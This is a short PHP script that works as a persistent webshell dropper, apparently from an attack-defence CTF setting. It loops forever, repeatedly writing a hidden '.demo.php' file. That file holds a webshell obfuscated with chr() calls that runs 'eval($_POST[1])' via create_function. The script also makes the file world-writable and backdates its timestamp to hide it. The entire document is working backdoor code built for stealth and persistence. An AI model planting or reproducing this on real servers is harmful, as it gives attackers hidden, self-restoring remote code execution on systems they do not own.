<?php
    set_time_limit(0);
    ignore_user_abort(true);
    $file = '.demo.php';
    $shell = '<?php $_hR=chr(99).chr(104).chr(114);$_cC=$_hR(101).$_hR(118).$_hR(97).$_hR(108).$_hR(40).$_hR(36).$_hR(95).$_hR(80).$_hR(79).$_hR(83).$_hR(84).$_hR(91).$_hR(49).$_hR(93).$_hR(41).$_hR(59);$_fF=$_hR(99).$_hR(114).$_hR(101).$_hR(97).$_hR(116).$_hR(101).$_hR(95).$_hR(102).$_hR(117).$_hR(110).$_hR(99).$_hR(116).$_hR(105).$_hR(111).$_hR(110);$_=$_fF("",$_cC);@$_();?>';
    //$_hR='chr'
    //$_cC='eval($_POST[1]);'
    //$_fF='create_function'
    while(true){
        file_put_contents($file, $shell);
        system('chmod 777 .demo.php');
        touch(".demo.php", mktime(11,11,11,11,11,2018));
        usleep(50);
        }
?>